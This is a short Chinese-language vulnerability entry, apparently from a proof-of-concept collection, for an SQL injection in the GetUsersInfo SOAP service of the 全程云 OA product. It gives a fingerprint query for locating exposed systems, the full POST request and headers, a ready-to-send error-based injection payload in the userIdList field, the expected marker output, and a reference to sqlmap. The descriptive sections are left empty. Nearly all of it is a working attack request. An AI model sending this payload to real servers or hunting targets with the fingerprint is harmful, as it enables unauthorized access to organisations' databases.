# 全程云OAGetUsersInfo存在SQL注入漏洞

- **系统**：全程云　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="全程 OA"`
- **请求**：`POST /oa/pm/svc.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=l4j5cieqfhdtrjdrckrz5lau`　`Sec-Fetch-User: ?1`　`SOAPAction: http://tempuri.org/GetUsersInfo`　`Content-Type: text/xml;charset=UTF-8`　`Host: {hostname}`　`Content-Length: 504`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetUsersInfo>
<!--type: string-->
<tem:userIdList>(CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1177=1177) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(106)+CHAR(113))))</tem:userIdList>
</tem:GetUsersInfo>
</soapenv:Body>
</soapenv:Envelope>
qjjbq1qvqjq
sqlmap
POST /oa/pm/svc.asmx HTTP/1.1
Cookie: ASP.NET_SessionId=l4j5cieqfhdtrjdrckrz5lau
Sec-Fetch-User: ?1
SOAPAction: http://temp…（脚本共 972 字，完整版见原文）
```

**其他**
- 全程云OA GetUsersInfo存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 全程云OA